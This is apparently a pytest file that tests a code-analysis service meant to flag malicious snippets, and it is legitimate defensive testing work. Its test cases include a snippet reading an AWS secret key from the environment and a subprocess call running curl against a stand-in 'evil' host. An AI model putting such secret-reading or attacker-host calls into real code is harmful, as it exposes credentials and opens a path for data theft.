import pytest, requests

API = "http://ml:8000/analyse/code"

@pytest.mark.parametrize("snippet, expected", [
    ("import os; os.environ.get('AWS_SECRET_KEY')", True),
    ("import subprocess; subprocess.call(['curl','http://evil'])", True),
    ("print('hello world')", False),
])

def test_code_injection(snippet, expected):
    resp = requests.post(API, json={"code": snippet})
    resp.raise_for_status()
    assert resp.json()["malicious"] == expected